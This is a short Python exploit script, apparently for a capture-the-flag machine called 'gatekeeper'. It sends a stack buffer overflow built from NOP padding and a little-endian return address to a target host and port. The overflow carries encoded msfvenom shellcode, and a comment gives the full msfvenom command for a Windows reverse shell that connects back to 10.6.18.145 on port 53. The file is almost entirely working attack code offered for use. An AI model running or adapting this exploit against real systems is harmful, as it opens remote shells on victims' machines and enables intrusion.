#!/usr/bin/env python

# Skeleton Buffer Overflow script
# usage python gatekeeper.py <targetIP> <targetPort>

import sys, socket

rhost = sys.argv[1]
rport = int(sys.argv[2])

# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.145 LPORT=53 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a"
shellcode = ("\xb8\x50\xc6\x7c\xfb\xda\xdf\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\x13\xc8\x9e\x0e\x6f\x3c\xdc"
"\xf1\x8f\xbd\x81\x78\x6a\x8c\x81\x1f\xff\xbf\x31\x6b\xad\x33"
"\xb9\x39\x45\xc7\xcf\x95\x6a\x60\x65\xc0\x45\x71\xd6\x30\xc4"
"\xf1\x25\x65\x26\xcb\xe5\x78\x27\x0c\x1b\x70\x75\xc5\x57\x27"
"\x69\x62\x2d\xf4\x02\x38\xa3\x7c\xf7\x89\xc2\xad\xa6\x82\x9c"
"\x6d\x49\x46\x95\x27\x51\x8b\x90\xfe\xea\x7f\x6e\x01\x3a\x4e"
"\x8f\xae\x03\x7e\x62\xae\x44\xb9\x9d\xc5\xbc\xb9\x20\xde\x7b"
"\xc3\xfe\x6b\x9f\x63\x74\xcb\x7b\x95\x59\x8a\x08\x99\x16\xd8"
"\x56\xbe\xa9\x0d\xed\xba\x22\xb0\x21\x4b\x70\x97\xe5\x17\x22"
"\xb6\xbc\xfd\x85\xc7\xde\x5d\x79\x62\x95\x70\x6e\x1f\xf4\x1c"
"\x43\x12\x06\xdd\xcb\x25\x75\xef\x54\x9e\x11\x43\x1c\x38\xe6"
"\xa4\x37\xfc\x78\x5b\xb8\xfd\x51\x98\xec\xad\xc9\x09\x8d\x25"
"\x09\xb5\x58\xe9\x59\x19\x33\x4a\x09\xd9\xe3\x22\x43\xd6\xdc"
"\x53\x6c\x3c\x75\xf9\x97\xd7\x70\xf8\x85\xb6\xed\x06\xa9\xb8"
"\xd8\x8f\x4f\xd2\x32\xc6\xd8\x4b\xaa\x43\x92\xea\x33\x5e\xdf"
"\x2d\xbf\x6d\x20\xe3\x48\x1b\x32\x94\xb8\x56\x68\x33\xc6\x4c"
"\x04\xdf\x55\x0b\xd4\x96\x45\x84\x83\xff\xb8\xdd\x41\x12\xe2"
"\x77\x77\xef\x72\xbf\x33\x34\x47\x3e\xba\xb9\xf3\x64\xac\x07"
"\xfb\x20\x98\xd7\xaa\xfe\x76\x9e\x04\xb1\x20\x48\xfa\x1b\xa4"
"\x0d\x30\x9c\xb2\x11\x1d\x6a\x5a\xa3\xc8\x2b\x65\x0c\x9d\xbb"
"\x1e\x70\x3d\x43\xf5\x30\x4d\x0e\x57\x10\xc6\xd7\x02\x20\x8b"
"\xe7\xf9\x67\xb2\x6b\x0b\x18\x41\x73\x7e\x1d\x0d\x33\x93\x6f"
"\x1e\xd6\x93\xdc\x1f\xf3")
                         #little endian
string = "\x90" * 146 + "\xc3\x14\x04\x08" + "\x90" * 16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(string + '\r\n')
data = s.recv(1024)
s.close()
